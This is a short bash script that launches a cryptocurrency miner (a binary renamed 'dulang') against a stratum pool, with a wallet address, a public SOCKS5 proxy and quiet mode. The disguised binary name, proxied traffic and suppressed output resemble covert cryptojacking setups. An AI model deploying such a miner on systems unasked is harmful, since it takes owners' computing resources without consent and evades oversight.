#!/bin/bash
POOL=stratum+tcps://stratum-eu.rplant.xyz:17042
WALLET=sugar1qsv26cl69kpgwujwmdhdl468ljm5ypr6kewh0gu.JOHAN
PROXY=socks5://98.178.72.8:4145
./dulang -a yespowersugar -o $POOL -u $WALLET -x $PROXY -q
